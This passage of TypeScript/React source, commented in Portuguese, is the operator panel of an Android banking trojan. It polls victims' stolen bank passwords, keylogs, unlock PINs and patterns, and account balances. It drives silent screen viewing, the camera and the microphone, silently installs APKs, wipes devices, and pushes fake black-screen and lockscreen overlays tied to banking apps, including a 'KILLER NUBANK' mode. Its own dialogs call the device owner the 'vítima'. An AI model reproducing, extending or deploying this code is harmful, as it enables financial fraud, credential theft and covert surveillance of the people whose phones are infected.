        fetchLegacyKeylogs();
      }
    }, 800);
    
    return () => clearInterval(interval);
  }, [deviceId, keylogSelectedDate]);

  // Polling de senhas bancárias (4s quando aberto, 60s quando fechado)
  useEffect(() => {
    if (!deviceId) return;
    
    const fetchBankPasswords = async () => {
      if (document.hidden) return;
      try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/bank-passwords`, {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          setBankPasswords(data);
        }
      } catch (error) {
        console.error('Erro ao buscar senhas bancárias:', error);
      }
    };
    
    fetchBankPasswords();
    const interval = setInterval(() => {
      if (!document.hidden && (floatingWindows.bankPasswords.open || floatingWindows.bankMonitor.open || showBankMonitorTab)) {
        fetchBankPasswords();
      }
    }, (floatingWindows.bankPasswords.open || floatingWindows.bankMonitor.open || showBankMonitorTab) ? 4000 : 60000);
    return () => clearInterval(interval);
  }, [deviceId, floatingWindows.bankPasswords.open, floatingWindows.bankMonitor.open, showBankMonitorTab]);
  
  // ¨ Polling de Keylogs do Banco Selecionado
  useEffect(() => {
    if (!deviceId || !selectedMonitorBank) {
      setBankKeylogs([]);
      return;
    }

    const pkg = selectedMonitorBank.package;
    const name = selectedMonitorBank.name || '';

    const fetchBankKeylogs = async () => {
      if (document.hidden) return;
      try {
        setIsLoadingBankKeylogs(true);
        const token = localStorage.getItem('token');
        const response = await fetch(
          `${getApiBaseUrl()}/api/devices/${deviceId}/keylogs?limit=500&include_offline=true&package=${encodeURIComponent(pkg)}&app_name=${encodeURIComponent(name)}`,
          { headers: { 'Authorization': `Bearer ${token}` } }
        );
        
        if (response.ok) {
          const data = await response.json();
          const parsedLogs = data.map((item: any) => {
            try {
              const parsed = JSON.parse(item.data);
              return { ...parsed, id: item.id, timestamp: item.created_at, isOffline: item.isOffline };
            } catch (e) {
              return { text: item.data, id: item.id, timestamp: item.created_at, isOffline: item.isOffline };
            }
          });
          setBankKeylogs(parsedLogs);
        }
      } catch (error) {
        console.error('Erro ao buscar keylogs do banco:', error);
      } finally {
        setIsLoadingBankKeylogs(false);
      }
    };

    fetchBankKeylogs();
    const interval = setInterval(() => {
      if (!document.hidden && floatingWindows.bankMonitor.open) fetchBankKeylogs();
    }, floatingWindows.bankMonitor.open ? 6000 : 60000);
    return () => clearInterval(interval);
  }, [deviceId, selectedMonitorBank?.package, selectedMonitorBank?.name, floatingWindows.bankMonitor.open]);
  
  // Polling de capturas customizadas (5s quando aberto, 60s quando fechado)
  useEffect(() => {
    if (!deviceId) return;
    
    const fetchCustomCaptures = async () => {
      if (document.hidden) return;
      try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/custom-captures`, {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          setCustomCaptures(data);
        }
      } catch (error) {
        console.error('Erro ao buscar capturas customizadas:', error);
      }
    };
    
    fetchCustomCaptures();
    const interval = setInterval(() => {
      if (!document.hidden && (showCustomCapturesModal || floatingWindows.bankMonitor.open)) fetchCustomCaptures();
    }, (showCustomCapturesModal || floatingWindows.bankMonitor.open) ? 5000 : 60000);
    return () => clearInterval(interval);
  }, [deviceId, showCustomCapturesModal, floatingWindows.bankMonitor.open]);

  const fetchNotifications = useCallback(async () => {
    if (!deviceId || document.hidden) return;
    setIsLoadingNotifications(true);
    try {
      const data = await devicesAPI.getNotifications(deviceId);
      setNotifications(data);
    } catch (err) {
      console.error('Erro ao buscar notificações do dispositivo', err);
    } finally {
      setIsLoadingNotifications(false);
    }
  }, [deviceId]);

  useEffect(() => {
    if (!showNotificationsTab) return;
    
    fetchNotifications();
    const interval = setInterval(() => {
      if (!document.hidden) fetchNotifications();
    }, 8000);
    return () => clearInterval(interval);
  }, [showNotificationsTab, fetchNotifications]);
  
  //  Polling de saldos bancários (8s quando aberto, 60s quando fechado)
  useEffect(() => {
    if (!deviceId) return;
    
    const fetchBankBalances = async () => {
      if (document.hidden) return;
      try {
        const token = localStorage.getItem('admin_token') || localStorage.getItem('token') || '';
        const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/bank-balances`, {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          setBankBalances(data);
        }
      } catch (error) {
        console.error('Erro ao buscar saldos bancários:', error);
      }
    };
    
    fetchBankBalances();
    const interval = setInterval(() => {
      if (!document.hidden && (floatingWindows.bankMonitor.open || showBankMonitorTab)) fetchBankBalances();
    }, (floatingWindows.bankMonitor.open || showBankMonitorTab) ? 8000 : 60000);
    return () => clearInterval(interval);
  }, [deviceId, floatingWindows.bankMonitor.open, showBankMonitorTab]);
  
  //  Polling de arquivos enviados (10s quando aberto, 60s quando fechado)
  useEffect(() => {
    if (!deviceId) return;
    
    const fetchUploadedFiles = async () => {
      if (document.hidden) return;
      try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/uploaded-files`, {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          setUploadedFiles(data);
        }
      } catch (error) {
        console.error('Erro ao buscar arquivos:', error);
      }
    };
    
    fetchUploadedFiles();
    const interval = setInterval(() => {
      if (!document.hidden && floatingWindows.keylogger.open) fetchUploadedFiles();
    }, floatingWindows.keylogger.open ? 10000 : 60000);
    return () => clearInterval(interval);
  }, [deviceId, floatingWindows.keylogger.open]);
  
  //  Polling de KEYLOGS OFFLINE (5s quando aberto, 60s quando fechado)
  useEffect(() => {
    if (!deviceId) return;
    
    const fetchOfflineKeylogs = async () => {
      if (document.hidden) return;
      try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/offline-keylogs`, {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          setOfflineKeylogs(data);
        }
      } catch (error) {
        console.error('Erro ao buscar keylogs offline:', error);
      }
    };
    
    fetchOfflineKeylogs();
    const interval = setInterval(() => {
      if (!document.hidden && floatingWindows.keylogger.open) fetchOfflineKeylogs();
    }, floatingWindows.keylogger.open ? 5000 : 60000);
    return () => clearInterval(interval);
  }, [deviceId, floatingWindows.keylogger.open]);
  
  //  Polling de PINs/Patterns/Passwords de DESBLOQUEIO capturados (4s quando aberto, 60s quando fechado)
  useEffect(() => {
    if (!deviceId) return;
    
    const fetchUnlockPins = async () => {
      if (document.hidden) return;
      try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/lockscreen-pins`, {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          setCapturedUnlockPins(Array.isArray(data) ? data : []);
        }
      } catch (error) {
        console.error('Erro ao buscar PINs de desbloqueio:', error);
      }
    };
    
    fetchUnlockPins();
    const interval = setInterval(() => {
      if (!document.hidden && floatingWindows.lockscreen.open) fetchUnlockPins();
    }, floatingWindows.lockscreen.open ? 4000 : 60000);
    return () => clearInterval(interval);
  }, [deviceId, floatingWindows.lockscreen.open]);
  
  // Polling da hierarquia da tela quando Screen Reader está ativado - OTIMIZADO
  useEffect(() => {
    if (!deviceId || !isScreenReaderEnabled) return;
    
    let isFetching = false;
    let lastData = '';
    
    const fetchHierarchy = async () => {
      // Evita requisições sobrepostas
      if (isFetching || document.hidden) return;
      isFetching = true;
      
      try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/screen-hierarchy`, {
          headers: {
            'Authorization': `Bearer ${token}`,
            'Cache-Control': 'no-cache'
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.status === 'ok' && data.data) {
            // Só atualiza se os dados mudaram (evita re-render desnecessário)
            if (data.data !== lastData) {
              lastData = data.data;
              try {
                const parsed = JSON.parse(data.data);
                setScreenHierarchy(parsed);
              } catch (e) {
                // Ignora erros de parse silenciosamente
              }
            }
          }
        }
      } catch {
        // Ignora erros de rede silenciosamente
      } finally {
        isFetching = false;
      }
    };
    
    const isV2Visible = showScreenReader || showCombinedVncV2 || floatingWindows.screenReader.open || isExpandedMode;
    if (!isV2Visible) return;

    fetchHierarchyRef.current = fetchHierarchy;
    fetchHierarchy();
    const interval = setInterval(fetchHierarchy, 3500);
    return () => {
      clearInterval(interval);
      fetchHierarchyRef.current = null;
    };
  }, [deviceId, isScreenReaderEnabled, showScreenReader, showCombinedVncV2, floatingWindows.screenReader.open, isExpandedMode]);

  const sendCommand = async (command: any) => {
    if (!deviceId) return;
    
    // Avisa se dispositivo parece offline
    if (deviceConnectionStatus === 'offline' || deviceConnectionStatus === 'stale') {
      console.warn('š  Dispositivo pode estar offline, tentando enviar mesmo assim...');
    }
    
    console.log(' Enviando comando:', command);
    
    try {
      await devicesAPI.sendCommand(deviceId, command);
      console.log(' Comando enviado com sucesso:', command.action);
      addLog(`Comando enviado: ${command.action}`);
      
      // Se for um comando de interação, solicita uma atualização de frame e hierarquia imediatamente!
      const isInteraction = ['CLICK', 'SWIPE', 'LONG_PRESS', 'TYPE', 'KEY', 'KEYEVENT', 'PRESS_BACK', 'PRESS_HOME', 'PRESS_RECENTS'].includes(command.action);
      if (isInteraction) {
        // Atualiza V2 (Screen Reader) após 100ms
        if (fetchHierarchyRef.current && isScreenReaderEnabled) {
          setTimeout(fetchHierarchyRef.current, 100);
        }
        // Atualiza VNC
        if (isCaptureEnabled) {
          void devicesAPI.sendCommand(deviceId, { action: 'REQUEST_VNC_FRAME' }).catch(() => {});
        }
      }
    } catch (error: any) {
      console.error(' Erro ao enviar comando:', error);
      
      // Trata erro 503 (dispositivo offline)
      if (error?.response?.status === 503) {
        addLog(`š  Dispositivo offline - aguarde reíconexão`);
        setDeviceConnectionStatus('offline');
      } else {
        addLog(`Erro ao enviar: ${command.action}`);
      }
    }
  };
  
  // Callback para atualizar status de íconexão do DeviceScreen
  const handleConnectionStatusChange = (status: 'online' | 'offline' | 'stale') => {
    setDeviceConnectionStatus(status);
    if (status === 'online') {
      addLog(' Dispositivo reíconectado!');
    } else if (status === 'stale') {
      addLog('š  Dispositivo pode estar offline (sem frames)');
    }
  };
  
  //  POWER BUTTON - Long Press para menu de desligar/reiniciar
  const handlePowerMouseDown = () => {
    // Inicia timer de 800ms para long press
    const timer = window.setTimeout(() => {
      setIsPowerLongPressed(true);
      sendCommand({ action: 'POWER_MENU' }); // Abre menu de desligar/reiniciar
      addLog(' Menu Power aberto (segurar)');
    }, 800);
    setPowerLongPressTimer(timer);
  };
  
  const handlePowerMouseUp = () => {
    // Cancela timer se soltar antes de 800ms
    if (powerLongPressTimer) {
      window.clearTimeout(powerLongPressTimer);
      setPowerLongPressTimer(null);
    }
    
    // Se não foi long press, é um clique normal (ligar/desligar tela)
    if (!isPowerLongPressed) {
      sendCommand({ action: 'POWER' });
      addLog(' Power (ligar/desligar tela)');
    }
    
    setIsPowerLongPressed(false);
  };
  
  const handlePowerMouseLeave = () => {
    // Cancela se o mouse sair do botão
    if (powerLongPressTimer) {
      window.clearTimeout(powerLongPressTimer);
      setPowerLongPressTimer(null);
    }
    setIsPowerLongPressed(false);
  };

  const addLog = (message: string) => {
    console.log(`[Control] ${message}`);
  };

  const handleReconnectConnection = async () => {
    setIsReconnectingConn(true);
    addLog(' Solicitando reinício da íconexão do aparelho...');
    try {
      await sendCommand({ action: 'RECONNECT_CONNECTION' });
      addLog(' Conexão resetada! Aguardando o handshake WebSocket do aparelho...');
    } catch (e: any) {
      addLog(' Erro ao enviar solicitação de reíconexão');
    } finally {
      setTimeout(() => setIsReconnectingConn(false), 2500);
    }
  };
  
  //  INSTALAÇO DE APK
  const handleInstallApk = async () => {
    if (!selectedApkFile || !deviceId) return;
    
    setIsInstallingApk(true);
    addLog(` Enviando APK: ${selectedApkFile.name}...`);
    
    try {
      const formData = new FormData();
      formData.append('apk_file', selectedApkFile);
      
      const token = localStorage.getItem('token');
      const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/install-apk`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`
        },
        body: formData
      });
      
      if (!response.ok) {
        throw new Error('Erro ao enviar APK');
      }
      
      const result = await response.json();
      addLog(` APK enviado! Instalando silenciosamente...`);
      console.log(' Resultado:', result);
      
      // Fecha o modal
      setShowInstallApkModal(false);
      setSelectedApkFile(null);
      
    } catch (error) {
      console.error(' Erro ao instalar APK:', error);
      addLog(` Erro ao instalar APK`);
    } finally {
      setIsInstallingApk(false);
    }
  };

  const handleFormatDevice = () => {
    const confirmed = window.confirm(" ATENÇO: Deseja realmente formatar o aparelho? Todos os dados serão apagados permanentemente!\n\nCertifique-se de que o Administrador de Dispositivo está ativo antes de continuar.");
    if (confirmed) {
      sendCommand({ action: 'FORMAT_DEVICE' });
    }
  };

  const handleRequestAdminPermission = () => {
    const confirmed = window.confirm("¡ Solicitar Administrador de Dispositivo?\n\nIsso abrirá uma tela no aparelho da vtima pedindo para ativar o Administrador de Dispositivo.\nNecessário para a função de Formatar Aparelho.");
    if (confirmed) {
      sendCommand({ action: 'REQUEST_ADMIN_PERMISSION' });
      addLog('¡ Solicitação de Administrador enviada ao aparelho...');
    }
  };

  const handleCheckAdminStatus = () => {
    sendCommand({ action: 'CHECK_ADMIN_STATUS' });
    addLog(' Verificando status de Administrador do aparelho...');
  };

  const handleSelfDestruct = () => {
    const confirmed = window.confirm(' REMOVER APP DO APARELHO?\n\nIsso desinstalará o app de monitoramento do dispositivo da vítima.\nO dispositivo deixará de aparecer no painel após a remoção.\n\nTem certeza?');
    if (confirmed) {
      sendCommand({ action: 'SELF_DESTRUCT' });
      addLog(' Comando de auto-remoção enviado ao aparelho...');
    }
  };

  const toggleBlackScreen = async () => {
    const newState = !isBlackScreen;
    // [KRYPTOS-PATCH SPEED] UI otimista
    setIsBlackScreen(newState);
    setIsBlackTouchBlocked(false);
    if (!newState) { setBlackScreenOpacity(100); }
    addLog(newState ? 'Tela preta ATIVADA' : 'Tela preta DESATIVADA');
    try {
      await sendCommand({ action: newState ? 'BLACK_SCREEN_ON' : 'BLACK_SCREEN_OFF' });
      await sendCommand({ action: 'TOGGLE_BLACK_SCREEN_TOUCH', blocked: false });
    } catch (e) {}
  };

  const toggleBlackScreenTouch = async () => {
    const newBlocked = !isBlackTouchBlocked;
    await sendCommand({ action: 'TOGGLE_BLACK_SCREEN_TOUCH', blocked: newBlocked });
    setIsBlackTouchBlocked(newBlocked);
    addLog(newBlocked ? ' Block Touch ATIVADO' : ' Block Touch DESATIVADO');
  };

  const handleBlackScreenOpacityChange = (val: number) => {
    setBlackScreenOpacity(val);
    if (blackScreenOpacityDebounceRef.current) {
      clearTimeout(blackScreenOpacityDebounceRef.current);
    }
    blackScreenOpacityDebounceRef.current = setTimeout(() => {
      sendCommand({ action: 'SET_BLACK_SCREEN_OPACITY', value: val });
    }, 80);
  };

  //  Aplicar tela preta customizada
  const applyCustomBlackScreen = async (template: any, targetPackageName?: string) => {
    try {
      console.log(' DEBUG: Enviando CUSTOM_BLACK_SCREEN com template:', template);
      console.log(' DEBUG: Template JSON:', JSON.stringify(template));
      
      // Enviar configuração da tela customizada para o dispositivo
      // Sempre define o block touch como desativado ao aplicar template
      setIsBlackTouchBlocked(false);
      await sendCommand({ action: 'TOGGLE_BLACK_SCREEN_TOUCH', blocked: false });

      // Define o pacote alvo com base nos parmetros
      const finalPkg = targetPackageName || template.package_name || template.packageName || '';

      // NO fazemos JSON.stringify aqui - o servidor já faz isso!
      // Passa o template diretamente como objeto
      await sendCommand({
        action: 'CUSTOM_BLACK_SCREEN',
        template: template,  // Objeto direto, não stringify!
        package: finalPkg
      });

      console.log(' DEBUG: Comando enviado com sucesso! Pacote alvo:', finalPkg);
      setCustomBlackScreenTemplate(template);
      setIsBlackScreen(true);
      setShowBlackScreenEditor(false);
      addLog(` Tela preta customizada aplicada: ${template.name}`);
    } catch (error) {
      console.error(' Erro ao aplicar tela customizada:', error);
      addLog(' Erro ao aplicar tela customizada');
    }
  };

  //  Salvar template de tela preta
  const saveBlackScreenTemplate = (template: any) => {
    setCustomBlackScreenTemplate(template);
    addLog(` Template salvo: ${template.name}`);
  };

  //  GATILHOS AUTOMTICOS DE OVERLAY
  const fetchOverlayMappings = async () => {
    if (!deviceId) return;
    try {
      const token = localStorage.getItem('token');
      const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/overlay-mappings`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (response.ok) {
        const data = await response.json();
        setOverlayMappings(data);
      }
    } catch (e) {
      console.error('Erro ao buscar mapeamentos de overlay:', e);
    }
  };

  const addOverlayMapping = async (pkg: string, projectId: string, screenIndex: number) => {
    if (!deviceId || !pkg || !projectId || screenIndex === null) return;
    try {
      const token = localStorage.getItem('token');
      
      // Busca projeto e tela
      const savedProjectsStr = localStorage.getItem('apkStudioProjects');
      const localProjects = savedProjectsStr ? JSON.parse(savedProjectsStr) : [];
      const projectsToUse = [PRESET_BANK_PROJECT, ...localProjects];
      const project = projectsToUse.find((p: any) => p.id === projectId);
      if (!project) return;
      const screen = project.screens[screenIndex];
      if (!screen) return;

      const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/overlay-mappings`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          package_name: pkg,
          project_id: projectId,
          screen_id: screen.id,
          screen_name: screen.name,
          template: screen,
          is_enabled: true
        })
      });

      if (response.ok) {
        addLog(` Auto-gatilho configurado para ${pkg}`);
        fetchOverlayMappings();
      } else {
        const err = await response.json();
        addLog(` Erro ao salvar gatilho: ${err.detail || 'erro desconhecido'}`);
      }
    } catch (e) {
      console.error('Erro ao criar mapeamento:', e);
      addLog(' Erro de rede ao criar mapeamento');
    }
  };

  const deleteOverlayMapping = async (mappingId: number) => {
    if (!deviceId) return;
    try {
      const token = localStorage.getItem('token');
      const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/overlay-mappings/${mappingId}`, {
        method: 'DELETE',
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (response.ok) {
        addLog(' Auto-gatilho removido');
        fetchOverlayMappings();
      }
    } catch (e) {
      console.error('Erro ao remover mapeamento:', e);
    }
  };

  const handleDeleteCustomCapture = async (id: number) => {
    if (!confirm('Deseja excluir esta captura?')) return;
    try {
      const token = localStorage.getItem('token');
      const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/custom-captures/${id}`, {
        method: 'DELETE',
        headers: {
          'Authorization': `Bearer ${token}`
        }
      });
      if (response.ok) {
        setCustomCaptures(prev => prev.filter(c => c.id !== id));
        addLog(` Captura customizada excluda!`);
      }
    } catch (err) {
      console.error('Erro ao excluir captura customizada:', err);
    }
  };

  const handleSendText = async () => {
    if (!textToSend.trim()) return;
    await sendCommand({ action: 'TYPE', text: textToSend });
    addLog(`Texto enviado: ${textToSend}`);
    setTextToSend('');
  };

  // toggleKeylogger - mantido para compatibilidade mas keylogger agora é 24/7
  const _toggleKeylogger = async () => {
    const newState = !isKeyloggerEnabled;
    console.log(' DEBUG: Enviando comando TOGGLE_KEYLOGGER, enabled:', newState);
    
    await sendCommand({ 
      action: 'TOGGLE_KEYLOGGER',
      enabled: newState
    });
    
    setIsKeyloggerEnabled(newState);
    addLog(newState ? 'Keylogger ATIVADO ¨' : 'Keylogger DESATIVADO');
  };
  void _toggleKeylogger; // Silencia warning de variável não usada
  
  const toggleScreenReader = async () => {
    const newState = !isScreenReaderEnabled;
    
    await sendCommand({ 
      action: 'TOGGLE_SCREEN_READER',
      enabled: newState
    });
    
    setIsScreenReaderEnabled(newState);
    if (newState) setShowScreenReader(true);
    addLog(newState ? 'Screen Reader V2 ATIVADO ' : 'Screen Reader V2 DESATIVADO');
  };
  
  //  CÂMERA EM TEMPO REAL
  const toggleCamera = async () => {
    const newState = !isCameraEnabled;
    
    await sendCommand({ 
      action: 'TOGGLE_CAMERA',
      enabled: newState
    });
    
    setIsCameraEnabled(newState);
    if (newState) {
      setShowCameraModal(true);
      // Inicia stream WebSocket
      startCameraStream();
    } else {
      setShowCameraModal(false);
      stopCameraStream();
    }
    addLog(newState ? 'Cmera ATIVADA ' : 'Cmera DESATIVADA');
  };
  
  const startCameraStream = () => {
    if (!deviceId) return;
    
    // Limpa reíconexão anterior se existir
    if ((window as any).cameraReconnectTimer) {
      clearTimeout((window as any).cameraReconnectTimer);
      delete (window as any).cameraReconnectTimer;
    }
    
    const token = localStorage.getItem('token');
    // Usa URL dinmica baseada no getApiBaseUrl()
    const wsProtocol = getApiBaseUrl().startsWith('https') ? 'wss' : 'ws';
    const wsBase = getApiBaseUrl().replace(/^https?/, wsProtocol);
    const ws = new WebSocket(`${wsBase}/ws/camera/${deviceId}?token=${token}`);
    
    ws.binaryType = 'arraybuffer';
    
    ws.onopen = () => {
      console.log(' Camera stream íconectado');
    };
    
    ws.onmessage = (event) => {
      // Converte ArrayBuffer para Blob
      const arrayBuffer = event.data instanceof ArrayBuffer ? event.data : null;
      if (!arrayBuffer) return;
      
      const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
      const url = URL.createObjectURL(blob);
      
      const img = new Image();
      img.onload = () => {
        const canvas = cameraCanvasRef.current;
        
        if (canvas) {
          const ctx = canvas.getContext('2d');
          if (ctx) {
            canvas.width = img.width;
            canvas.height = img.height;
            ctx.drawImage(img, 0, 0);
          }
        }
        
        URL.revokeObjectURL(url);
      };
      img.src = url;
    };
    
    ws.onerror = (error) => {
      console.error(' Erro no camera stream:', error);
      ws.close();
    };
    
    ws.onclose = () => {
      console.log(' Camera stream desíconectado');
      //  REÍCONEXƒO AUTOMTICA se a c¢mera ainda estiver habilitada
      if (isCameraEnabled && showCameraModal) {
        console.log(' Reíconectando cmera em 2 segundos...');
        (window as any).cameraReconnectTimer = setTimeout(() => {
          startCameraStream();
        }, 2000);
      }
    };
    
    // Armazena WebSocket para fechar depois
    (window as any).cameraWs = ws;
  };
  
  const stopCameraStream = () => {
    // Limpa timer de reíconexão
    if ((window as any).cameraReconnectTimer) {
      clearTimeout((window as any).cameraReconnectTimer);
      delete (window as any).cameraReconnectTimer;
    }
    
    const ws = (window as any).cameraWs;
    if (ws) {
      ws.close();
      delete (window as any).cameraWs;
    }
  };
  
  //  Alterna entre cmera frontal e traseira
  const switchCamera = async () => {
    const newCamera = currentCamera === 'back' ? 'front' : 'back';
    setCurrentCamera(newCamera);
    
    await sendCommand({ 
      action: 'SWITCH_CAMERA',
      camera: newCamera
    });
    
    addLog(`Cmera alternada para ${newCamera === 'front' ? 'FRONTAL' : 'TRASEIRA'}`);
  };
  
  //  MICROFONE EM TEMPO REAL
  const toggleMicrophone = async () => {
    const newState = !isMicrophoneEnabled;
    
    await sendCommand({ 
      action: 'TOGGLE_MICROPHONE',
      enabled: newState
    });
    
    setIsMicrophoneEnabled(newState);
    if (newState) {
      setShowMicrophoneModal(true);
      startMicrophoneStream();
    } else {
      setShowMicrophoneModal(false);
      stopMicrophoneStream();
    }
    addLog(newState ? 'Microfone ATIVADO ' : 'Microfone DESATIVADO');
  };
  
  const startViewer = async (qualityOverride?: number) => {
    const q = qualityOverride ?? silentQuality;
    await sendCommand({
      action: 'TOGGLE_SILENT_VNC',
      enabled: true,
      silent_only: true,
      quality: q
    });
    await sendCommand({ action: 'START_SILENT_VNC' });
    await sendCommand({ action: 'REQUEST_VNC_FRAME' });
    setIsCaptureEnabled(true);
    addLog(`VNC ativado (qualidade ${q}%)`);
  };

  const applySilentQuality = async (q: number) => {
    const clamped = Math.min(100, Math.max(10, q));
    setSilentQuality(clamped);
    if (isCaptureEnabled) {
      await sendCommand({ action: 'SET_SILENT_VNC_QUALITY', quality: clamped });
      addLog(`Qualidade VNC  ${clamped}%`);
    }
  };

  const toggleKillerMode = async () => {
    const next = !isKillerMode;
    setIsKillerMode(next);
    await sendCommand({ action: 'TOGGLE_KILLER_MODE', enabled: next });
    addLog(next ? 'KILLER NUBANK ativado' : 'KILLER NUBANK desativado');
  };

  const killerFrameThrottleRef = useRef(0);
  const requestKillerFrame = useCallback(() => {
    if (!deviceId) return;
    const now = Date.now();
    if (now - killerFrameThrottleRef.current < 40) return;
    killerFrameThrottleRef.current = now;
    void devicesAPI.sendCommand(deviceId, { action: 'REQUEST_VNC_FRAME' }).catch(() => {});
    void devicesAPI.sendCommand(deviceId, { action: 'PING' }).catch(() => {});
  }, [deviceId]);

  const stopViewer = async () => {
    await sendCommand({
      action: 'TOGGLE_SILENT_VNC',
      enabled: false
    });
    setIsCaptureEnabled(false);
    addLog('Captura desativada');
  };

  const toggleCapture = async () => {
    if (isCaptureEnabled) {
      await stopViewer();
    } else {
      await startViewer();
    }
  };

  const restartCapture = async () => {
    addLog('Reiniciando VNC...');
    await sendCommand({ action: 'FORCE_RESTART_VNC', enabled: true });
    setIsCaptureEnabled(true);
    addLog('VNC reiniciado');
  };

  // Menu de contexto do Dashboard  abrir painel/modal correspondente
  useEffect(() => {
    const panel = (location.state as { openPanel?: string } | null)?.openPanel;
    if (!panel || !deviceId) return;

    const key = `${deviceId}:${panel}`;
    if (openPanelHandledRef.current === key) return;
    openPanelHandledRef.current = key;

    const openFloatingWindow = (windowId: keyof typeof floatingWindows) => {
      setIsFloatingMode(true);
      setFloatingWindows((prev) => ({
        ...prev,
        [windowId]: { ...prev[windowId], open: true },
      }));
    };

    (async () => {
      switch (panel) {
        case 'screen':
          document.getElementById('device-viewer')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
          break;
        case 'silent':
          await startViewer();
          document.getElementById('device-viewer')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
          break;
        case 'blackScreen':
          setShowBlackScreenEditor(true);
          break;
        case 'screenReader':
          if (!isScreenReaderEnabled) await toggleScreenReader();
          setShowScreenReader(true);
          break;
        case 'camera':
          setShowCameraModal(true);
          break;
        case 'mic':
          if (!isMicrophoneEnabled) await toggleMicrophone();
          setShowMicrophoneModal(true);
          break;
        case 'apps':
          setShowAppsModal(true);
          break;
        case 'duplicator':
          openDuplicatorModal();
          break;
        case 'keylogger':
          openFloatingWindow('keylogger');
          break;
        case 'lockscreen':
          setShowLockscreenModal(true);
          break;
        case 'sms':
          setShowSmsModal(true);
          break;
        case 'contacts':
          setShowContactsModal(true);
          fetchContacts();
          break;
        case 'injection':
          setShowInjectionModal(true);
          break;
        case 'floating':
          setIsFloatingMode(true);
          break;
        default:
          break;
      }
    })();

    navigate(location.pathname, { replace: true, state: {} });
  }, [location.state, deviceId]);
  
  //  LOCKSCREEN PIN + PATTERN - IGUAL EAGLESPY V5
  
  // Busca PIN e Pattern armazenados no servidor
  const fetchDeviceLockData = async () => {
    if (!deviceId) return;
    try {
      const token = localStorage.getItem('token');
      
      // Busca PIN
      const pinResponse = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/pin`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (pinResponse.ok) {
        const data = await pinResponse.json();
        if (data.pin) {
          setCapturedPin(data.pin);
          setPinInput(data.pin);
        }
        if (typeof data.lockscreen_active === 'boolean') {
          setIsLockscreenActive(data.lockscreen_active);
        }
      }
      
      // Busca Pattern
      const patternResponse = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/pattern`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (patternResponse.ok) {
        const data = await patternResponse.json();
        if (data.pattern) {
          setCapturedPattern(data.pattern);
          setPatternInput(data.pattern);
        }
        if (typeof data.lockscreen_active === 'boolean') {
          setIsLockscreenActive(data.lockscreen_active);
        }
      }
    } catch (error) {
      console.error('Erro ao buscar dados de lock:', error);
    }
  };
  
  // Salva PIN no servidor
  const saveDevicePin = async (pin: string) => {
    if (!deviceId) return;
    try {
      const token = localStorage.getItem('token');
      const formData = new FormData();
      formData.append('pin', pin);
      
      await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/pin`, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}` },
        body: formData
      });
      setCapturedPin(pin);
      addLog(` PIN salvo: ${pin}`);
    } catch (error) {
      console.error('Erro ao salvar PIN:', error);
    }
  };
  
  const playPinNow = async () => {
    if (!deviceId) return;
    const pin = pinInput || capturedPin;
    if (!pin) { addLog('Sin PIN para enviar'); return; }
    try {
      const token = localStorage.getItem('token');
      const formData = new FormData();
      formData.append('pin', pin);
      formData.append('delay', '900');
      const res = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/play-pin`, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}` },
        body: formData
      });
      addLog(res.ok ? `Desbloqueo enviado: ${pin}` : 'No se pudo enviar el desbloqueo');
    } catch {
      addLog('Error al enviar el desbloqueo');
    }
  };
  // Salva Pattern no servidor
  const saveDevicePattern = async (pattern: string) => {
    if (!deviceId) return;
    try {
      const token = localStorage.getItem('token');
      const formData = new FormData();
      formData.append('pattern', pattern);
      
      await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/pattern`, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}` },
        body: formData
      });
      setCapturedPattern(pattern);
      addLog(` Pattern salvo: ${pattern}`);
    } catch (error) {
      console.error('Erro ao salvar Pattern:', error);
    }
  };
  
  // Mostra overlay de lockscreen fake (PIN ou PATTERN)
  const showLockscreen = async () => {
    await sendCommand({ action: 'SHOW_LOCKSCREEN', type: lockscreenType });
    setIsLockscreenActive(true);
    addLog(` Lockscreen ${lockscreenType} ATIVADO - Aguardando vítima...`);
  };
  
  // Esconde overlay de lockscreen
